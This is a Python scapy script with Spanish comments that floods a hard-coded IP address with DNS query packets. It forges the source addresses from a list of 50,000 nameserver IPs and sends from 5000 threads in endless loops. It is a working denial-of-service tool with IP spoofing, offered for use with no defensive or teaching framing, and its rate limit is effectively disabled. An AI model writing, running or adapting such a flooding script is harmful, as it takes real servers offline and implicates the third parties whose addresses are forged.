import random
from scapy.all import *
import threading
import time

# Ruta al archivo con las IPs de servidores DNS
dns_ips_file = "nameservers_50k.txt"  # Nombre de tu archivo con las IPs de DNS

# Dirección de destino (tu servidor web)
target_ip = "51.79.83.115"  # La IP de tu servidor web 
target_port = 80  # Puerto de destino (ajústalo si usas otro puerto, este es para la consulta DNS)

# Número de hilos y paquetes por hilo
threads = 5000  # Número de hilos concurrentes
packets_per_thread = 5000  # Paquetes por hilo

# Control de la tasa de solicitudes por segundo (para evitar saturación rápida)
requests_per_second = 100000  # Solicitudes por segundo

# Cargar las IPs de servidores DNS desde el archivo
def load_dns_ips(file):
    try:
        with open(file, "r") as f:
            return [line.strip() for line in f.readlines()]
    except Exception as e:
        print(f"Error al leer el archivo: {e}")
        return []

# Generar tráfico DNS con las IPs
def generate_dns_traffic(dns_ips):
    while True:
        # Rotar las IPs de manera balanceada
        dns_ip = random.choice(dns_ips)
        
        # Falsificación de la IP de origen (servidor DNS), dirección de destino sigue siendo el servidor web
        # Aquí se crea un paquete DNS con una IP de origen falsa, apuntando al servidor web como destino
        packet = IP(src=dns_ip, dst=target_ip) / UDP(sport=random.randint(1024, 65535), dport=53) / DNS(rd=1, qd=DNSQR(qname="aquicolocascualquierweb.com"))
        
        # Enviar el paquete
        send(packet, verbose=False)
        
        # Controlar la tasa de solicitudes por segundo
        time.sleep(0 / requests_per_second)

# Iniciar hilos para generar tráfico DNS
def start_dns_traffic(dns_ips):
    threads_list = []
    for i in range(threads):
        t = threading.Thread(target=generate_dns_traffic, args=(dns_ips,))
        threads_list.append(t)
        t.start()
    
    # Esperar que todos los hilos terminen
    for t in threads_list:
        t.join()

# Cargar las IPs de servidores DNS desde el archivo
dns_ips = load_dns_ips(dns_ips_file)
if dns_ips:
    # Iniciar el tráfico DNS
    start_dns_traffic(dns_ips)
else:
    print("No se pudo cargar la lista de servidores DNS desde el archivo.")
